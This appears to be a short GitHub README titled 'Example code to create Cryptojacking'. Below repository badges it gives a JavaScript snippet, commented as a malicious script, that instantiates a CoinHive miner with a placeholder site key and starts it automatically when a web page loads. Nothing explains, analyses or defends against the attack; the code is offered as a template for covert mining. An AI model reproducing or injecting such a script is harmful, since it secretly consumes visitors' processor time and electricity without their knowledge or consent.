<h2 align="center">Example code to create Cryptojacking</h2>

<p align="center"><a href="https://github.com/Sasser1337/Cryptojacking/stargazers"><img src="https://img.shields.io/github/stars/Sasser1337/Cryptojacking" alt="Stars Badge"/></a> <a align="center">
<a href="https://github.com/Sasser1337/awesome-github-profile-readme/network/members"><img src="https://img.shields.io/github/forks/Sasser1337/Cryptojacking" alt="Forks Badge"/></a> <a align="center">
<a href="https://github.com/Sasser1337/Cryptojacking/blob/master/LICENSE"><img src="https://img.shields.io/github/license/Sasser1337/Cryptojacking?color=2b9348" alt="License Badge"/></a> <a align="center">

<h2> Example code </h2>

```javascript
//Create a malicious script
<script>
  //Create a function to start the cryptojacking process
  function startCryptojacking() {
    //Create a variable to store the miner
    var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
    //Start the miner
    miner.start();
    //Listen for any errors
    miner.on('error', function(params) {
      console.log('An error occured while cryptojacking: ' + params.error);
    });
  }
  //Call the function to start the cryptojacking process
  startCryptojacking();
</script>
```
